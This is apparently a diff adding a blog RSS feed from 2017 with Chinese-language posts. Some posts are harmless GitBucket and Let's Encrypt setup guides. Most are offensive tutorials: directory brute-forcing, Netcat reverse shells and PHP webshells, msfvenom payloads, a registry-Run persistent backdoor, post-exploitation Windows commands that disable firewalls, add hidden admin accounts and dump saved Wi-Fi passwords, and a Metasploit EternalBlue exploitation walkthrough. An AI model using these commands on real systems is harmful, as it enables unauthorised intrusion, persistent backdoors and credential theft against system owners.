+      &lt;li&gt;&lt;a href=&quot;#1-dirb&quot; id=&quot;markdown-toc-1-dirb&quot;&gt;1. dirb&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#2-dirbuster&quot; id=&quot;markdown-toc-2-dirbuster&quot;&gt;2. dirbuster&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#3-metasploit&quot; id=&quot;markdown-toc-3-metasploit&quot;&gt;3. metasploit&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#4-dirsearch&quot; id=&quot;markdown-toc-4-dirsearch&quot;&gt;4. dirsearch&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;几种暴力破解web服务器目录的方式&quot;&gt;几种暴力破解web服务器目录的方式&lt;/h1&gt;
+
+&lt;h2 id=&quot;1-dirb&quot;&gt;1. dirb&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;dir &lt;/span&gt;http://xxx.xxx.xxx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;词典路径 /usr/share/dirb/wordlists&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;2-dirbuster&quot;&gt;2. dirbuster&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dirbuster
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dirbuster&lt;/code&gt;是图形化的界面，默认词典路径 /usr/share/dirbuster/wordlists&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;3-metasploit&quot;&gt;3. metasploit&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use auxiliary/scanner/http/dir_scanner
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;4-dirsearch&quot;&gt;4. dirsearch&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/maurosoria/dirsearch
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>  
+               <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/11/brute-crack-dir-in-web/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/11/brute-crack-dir-in-web/</guid>  
+               </item>  
+          
+            <item>  
+               <title>Netcat常用方法汇总</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#netcat常用方法汇总&quot; id=&quot;markdown-toc-netcat常用方法汇总&quot;&gt;Netcat常用方法汇总&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#1-基本使用&quot; id=&quot;markdown-toc-1-基本使用&quot;&gt;1. 基本使用&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#11-聊天工具&quot; id=&quot;markdown-toc-11-聊天工具&quot;&gt;1.1 聊天工具&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#12-文件传输&quot; id=&quot;markdown-toc-12-文件传输&quot;&gt;1.2 文件传输&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#13-反向后门&quot; id=&quot;markdown-toc-13-反向后门&quot;&gt;1.3 反向后门&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#2-综合使用&quot; id=&quot;markdown-toc-2-综合使用&quot;&gt;2. 综合使用&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#21-结合php反向后门&quot; id=&quot;markdown-toc-21-结合php反向后门&quot;&gt;2.1 结合php反向后门&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#22-结合msfvenom使用&quot; id=&quot;markdown-toc-22-结合msfvenom使用&quot;&gt;2.2 结合msfvenom使用&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#23-做持久化后门使用&quot; id=&quot;markdown-toc-23-做持久化后门使用&quot;&gt;2.3 做持久化后门使用&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;netcat常用方法汇总&quot;&gt;Netcat常用方法汇总&lt;/h1&gt;
+
+&lt;h2 id=&quot;1-基本使用&quot;&gt;1. 基本使用&lt;/h2&gt;
+
+&lt;h3 id=&quot;11-聊天工具&quot;&gt;1.1 聊天工具&lt;/h3&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 服务端&lt;/span&gt;
+nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 5678
+&lt;span class=&quot;c&quot;&gt;# 客户端&lt;/span&gt;
+nc 192.168.1.15 5678
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;12-文件传输&quot;&gt;1.2 文件传输&lt;/h3&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 接收端&lt;/span&gt;
+nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 5555 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; a.zip
+&lt;span class=&quot;c&quot;&gt;# 发送端&lt;/span&gt;
+nc 192.168.1.5 5678 &amp;lt; cms.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;13-反向后门&quot;&gt;1.3 反向后门&lt;/h3&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 监听端&lt;/span&gt;
+nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 5678
+&lt;span class=&quot;c&quot;&gt;# 控制端&lt;/span&gt;
+nc 192.168.1.5 5678 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; cmd.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;2-综合使用&quot;&gt;2. 综合使用&lt;/h2&gt;
+
+&lt;h3 id=&quot;21-结合php反向后门&quot;&gt;2.1 结合php反向后门&lt;/h3&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 控制端启动监听&lt;/span&gt;
+nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1234
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;编辑php反弹shell后门，&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /usr/share/webshells/php/php-reverse-shell.php&lt;/code&gt;，修改 &lt;strong&gt;$ip&lt;/strong&gt; 和 &lt;strong&gt;$port&lt;/strong&gt; 为控制端的地址和端口
+将 &lt;code class=&quot;highlighter-rouge&quot;&gt;php-reverse-shell.php&lt;/code&gt; 文件上传至目标服务器中，通过浏览器触发 &lt;code class=&quot;highlighter-rouge&quot;&gt;php-reverse-shell.php&lt;/code&gt; 文件路径，在nc终端中的到反弹shell&lt;/p&gt;
+
+&lt;h3 id=&quot;22-结合msfvenom使用&quot;&gt;2.2 结合msfvenom使用&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;windows/shell_hidden_bind_tcp&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom –p windows/shell_hidden_bind_tcp &lt;span class=&quot;nv&quot;&gt;ahost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.0.107 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 –f exe &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; root.exe
+nc 192.168.0.103 4444
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;windows/shell_reverse_tcp&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom –p windows/shell_reverse_tcp  &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.0.107 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8888 –f exe &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; root.exe
+nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 8888
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;23-做持久化后门使用&quot;&gt;2.3 做持久化后门使用&lt;/h3&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 将nc.exe上传至目标服务器中指定目录&lt;/span&gt;
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; upload /usr/share/windows-binaries/nc.exe C:&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Windows&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;system32
+
+&lt;span class=&quot;c&quot;&gt;# 切换到目标cmd环境&lt;/span&gt;
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell
+
+&lt;span class=&quot;c&quot;&gt;# 添加自启动注册表项&lt;/span&gt;
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&amp;gt; reg setval &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; HKLM&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;software&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;microsoft&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;windows&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;currentversion&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;run &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; netcat &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'C:\windows\system32\nc.exe -Ldp 4445 -e cmd.exe'&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 添加nc出入站防火墙规则&lt;/span&gt;
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&amp;gt; netsh advfirewall firewall add rule &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'netcat'&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;allow &lt;span class=&quot;nv&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Tcp &lt;span class=&quot;nv&quot;&gt;localport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4445
+
+&lt;span class=&quot;c&quot;&gt;# 检查nc防火墙是否已经开放&lt;/span&gt;
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&amp;gt; netsh firewall show portopening
+
+&lt;span class=&quot;c&quot;&gt;# 重启目标电脑，使用nc连接&lt;/span&gt;
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&amp;gt; nc &lt;span class=&quot;nt&quot;&gt;-nv&lt;/span&gt; 192.168.0.101 4445
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>  
+               <pubDate>Sat, 11 Nov 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/11/netcat-general/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/11/netcat-general/</guid>  
+               </item>  
+          
+            <item>  
+               <title>使用gitbucker快速搭建git服务器</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#使用gitbucker快速搭建git服务器&quot; id=&quot;markdown-toc-使用gitbucker快速搭建git服务器&quot;&gt;使用gitbucker快速搭建git服务器&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#介绍&quot; id=&quot;markdown-toc-介绍&quot;&gt;介绍&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#下载使用&quot; id=&quot;markdown-toc-下载使用&quot;&gt;下载使用&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#访问地址&quot; id=&quot;markdown-toc-访问地址&quot;&gt;访问地址&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#丰富特性&quot; id=&quot;markdown-toc-丰富特性&quot;&gt;丰富特性&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;使用gitbucker快速搭建git服务器&quot;&gt;使用gitbucker快速搭建git服务器&lt;/h1&gt;
+
+&lt;h2 id=&quot;介绍&quot;&gt;介绍&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://gitbucket.github.io/&quot;&gt;Gitbucker&lt;/a&gt; 是用Scala语言编写的开源git服务器，安装和使用非常简单。适合个人或者小型团队成员使用。&lt;/p&gt;
+
+&lt;h2 id=&quot;下载使用&quot;&gt;下载使用&lt;/h2&gt;
+
+&lt;p&gt;下载地址：&lt;a href=&quot;https://github.com/gitbucket/gitbucket/releases&quot;&gt;https://github.com/gitbucket/gitbucket/releases&lt;/a&gt; (需要翻墙)&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 启动&lt;/span&gt;
+java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; gitbucket.war
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;访问地址&quot;&gt;访问地址&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Gitbucker&lt;/strong&gt; 启动后默认的端口是8080，登录的用户名密码都是 root。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/screenshot-repository_viewer.png&quot; alt=&quot;gitbucker&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;丰富特性&quot;&gt;丰富特性&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Gitbucker&lt;/strong&gt; 除了具备基本的git服务器功能外，还提供了强大的插件系统，允许安装更多的插件以满足更多的项目要求。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/screenshot-plugin_system.png&quot; alt=&quot;gitbucker&quot; /&gt;&lt;/p&gt;
+</description>  
+               <pubDate>Mon, 30 Oct 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/10/quick-build-gitbucker/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/10/quick-build-gitbucker/</guid>  
+               </item>  
+          
+            <item>  
+               <title>在渗透后非常有用的windows命令整理</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#在渗透后非常有用的windows命令整理&quot; id=&quot;markdown-toc-在渗透后非常有用的windows命令整理&quot;&gt;在渗透后非常有用的windows命令整理&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#注意事项&quot; id=&quot;markdown-toc-注意事项&quot;&gt;注意事项&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#命令明细&quot; id=&quot;markdown-toc-命令明细&quot;&gt;命令明细&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;在渗透后非常有用的windows命令整理&quot;&gt;在渗透后非常有用的windows命令整理&lt;/h1&gt;
+
+&lt;h2 id=&quot;注意事项&quot;&gt;注意事项&lt;/h2&gt;
+
+&lt;p&gt;以下整理的命令不一定在所有windows平台适用，如win10版本等高版本的系统会被拒绝访问，某些杀毒软件会弹出提示框显示授权操作，所以建议是拿到超级管理员权限，且将目标主机的杀毒软件卸载或者关闭。&lt;/p&gt;
+
+&lt;h2 id=&quot;命令明细&quot;&gt;命令明细&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 关闭防火墙
+netsh advfirewall set allprofiles state off
+netsh firewall set opmode disable
+
+# 添加防火墙出入站规则（关闭防火墙失败的情况）
+netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445
+# 检查查看防火墙配置的出入站规则
+netsh firewall show portopening
+
+# 查看进程杀死进程
+tasklist
+tskill 6486
+
+# 创建用户并添加到管理员组
+net user vinny$ 123321 /add
+net localgroup administrators vinny$ /add
+
+# 删除目标用户或者密码
+net user vinny$ *
+net user vinny$ /delete
+
+# 压缩文件夹或者文件（目标系统安装好winrar的情况）
+&quot;%ProgramFiles%\Winrar\rar&quot; a -ag -k -r -s -ibck a.rar &quot;SAP BYD资料&quot;
+&quot;%ProgramFiles%\Winrar\rar&quot; a -ag -k -r -s -ibck a.rar 1.txt 2.txt
+
+# 查看目标机器保存的无线热点和密码
+netsh wlan show profile
+netsh wlan show profile name=&quot;menote2&quot; key=clear
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>  
+               <pubDate>Sun, 29 Oct 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/10/windows-useful-cmds/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/10/windows-useful-cmds/</guid>  
+               </item>  
+          
+            <item>  
+               <title>永恒之蓝(ms17-010-eternalblue)漏洞利用</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#永恒之蓝ms17-010-eternalblue漏洞利用&quot; id=&quot;markdown-toc-永恒之蓝ms17-010-eternalblue漏洞利用&quot;&gt;永恒之蓝(ms17-010-eternalblue)漏洞利用&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#适用版本&quot; id=&quot;markdown-toc-适用版本&quot;&gt;适用版本&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#目标扫描&quot; id=&quot;markdown-toc-目标扫描&quot;&gt;目标扫描&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#漏洞攻击&quot; id=&quot;markdown-toc-漏洞攻击&quot;&gt;漏洞攻击&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;永恒之蓝ms17-010-eternalblue漏洞利用&quot;&gt;永恒之蓝(ms17-010-eternalblue)漏洞利用&lt;/h1&gt;
+
+&lt;h2 id=&quot;适用版本&quot;&gt;适用版本&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Windows XP (all services pack) (x86) (x64)&lt;/li&gt;
+  &lt;li&gt;Windows Server 2003 SP0 (x86)&lt;/li&gt;
+  &lt;li&gt;Windows Server 2003 SP1/SP2 (x86)&lt;/li&gt;
+  &lt;li&gt;Windows Server 2003 (x64)&lt;/li&gt;
+  &lt;li&gt;Windows Vista (x86)&lt;/li&gt;
+  &lt;li&gt;Windows Vista (x64)&lt;/li&gt;
+  &lt;li&gt;Windows Server 2008 (x86)&lt;/li&gt;
+  &lt;li&gt;Windows Server 2008 R2 (x86) (x64)&lt;/li&gt;
+  &lt;li&gt;Windows 7 (all services pack) (x86) (x64)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;目标扫描&quot;&gt;目标扫描&lt;/h2&gt;
+
+&lt;p&gt;这里以内网扫描进行测试，所有扫描内网中所有主机，并检查其是否存在此漏洞。&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use auxiliary/scanner/smb/smb_ms17_010
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOSTS 192.168.1.0/24
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;THREADS 100
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;漏洞攻击&quot;&gt;漏洞攻击&lt;/h2&gt;
+
+&lt;p&gt;确定好目标主机后，就可以使用启动监听并进行攻击&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/windows/smb/ms17_010_eternalblue
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/meterpreter/reverse_tcp
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST 192.168.1.15
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LPORT 4444
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOST 192.168.1.110
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>  
+               <pubDate>Sat, 28 Oct 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/10/ms17-010-eternalblue/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/10/ms17-010-eternalblue/</guid>  
+               </item>  
+          
+            <item>  
+               <title>使用Lets Encrypt为站点快速部署SSL证书</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#使用lets-encrypt为站点快速部署ssl证书&quot; id=&quot;markdown-toc-使用lets-encrypt为站点快速部署ssl证书&quot;&gt;使用Lets Encrypt为站点快速部署SSL证书&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#使用背景&quot; id=&quot;markdown-toc-使用背景&quot;&gt;使用背景&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#下载安装脚本&quot; id=&quot;markdown-toc-下载安装脚本&quot;&gt;下载安装脚本&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#配置相关信息&quot; id=&quot;markdown-toc-配置相关信息&quot;&gt;配置相关信息&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#执行证书生成&quot; id=&quot;markdown-toc-执行证书生成&quot;&gt;执行证书生成&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#配置证书安装&quot; id=&quot;markdown-toc-配置证书安装&quot;&gt;配置证书安装&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;使用lets-encrypt为站点快速部署ssl证书&quot;&gt;使用Lets Encrypt为站点快速部署SSL证书&lt;/h1&gt;
+
+&lt;h2 id=&quot;使用背景&quot;&gt;使用背景&lt;/h2&gt;
+
+&lt;p&gt;时常搜索”免费ssl证书”，申请和验证步骤很麻烦，审核时间也不定，”&lt;strong&gt;&lt;a href=&quot;https://letsencrypt.org/&quot;&gt;Lets Encrypt&lt;/a&gt;&lt;/strong&gt;“是一个倡导互联网上所有网站都该使用https的组织，提供免费的ssl证书服务。&lt;/p&gt;
+
+&lt;h2 id=&quot;下载安装脚本&quot;&gt;下载安装脚本&lt;/h2&gt;
+
+&lt;p&gt;下载Github上贡献者做好的安装脚本，如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://raw.githubusercontent.com/xdtianyu/scripts/master/lets-encrypt/letsencrypt.conf
+wget https://raw.githubusercontent.com/xdtianyu/scripts/master/lets-encrypt/letsencrypt.sh
+
+&lt;span class=&quot;c&quot;&gt;# 赋予执行权限&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x letsencrypt.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;配置相关信息&quot;&gt;配置相关信息&lt;/h2&gt;
+
+&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;vi letsencrypt.conf&lt;/code&gt;打开配置文件，将里面的 &lt;strong&gt;example.com&lt;/strong&gt; 换成自己的域名，如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# only modify the values, key files will be generated automaticly.
+ACCOUNT_KEY=&quot;letsencrypt-account.key&quot;
+DOMAIN_KEY=&quot;tiger.com.key&quot;
+DOMAIN_DIR=&quot;/usr/local/openresty/nginx/html&quot;
+DOMAINS=&quot;DNS:test.tiger.com&quot;
+#ECC=TRUE
+#LIGHTTPD=TRUE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;按以往免费申请ssl的经历，通常都需要验证域名的所属权，不是通过配置二级域名验证就是需要在网站根目录上传验证文件，经过试用 &lt;strong&gt;Lets Encrypt&lt;/strong&gt;，发现它使用的是第二种方式。&lt;/p&gt;
+
+&lt;p&gt;所以在使用nginx做动态代理时，需要先注释掉，使用基本的静态文件方式配置nginx的虚拟主机以便 &lt;strong&gt;Lets Encrypt&lt;/strong&gt; 去做验证，等ssl安装好之后在配置成动态代理即可。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;所以上述配置文件中的 DOMAIN_DIR 很重要，否则会执行失败&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;执行证书生成&quot;&gt;执行证书生成&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./letsencrypt.sh ./letsencrypt.conf
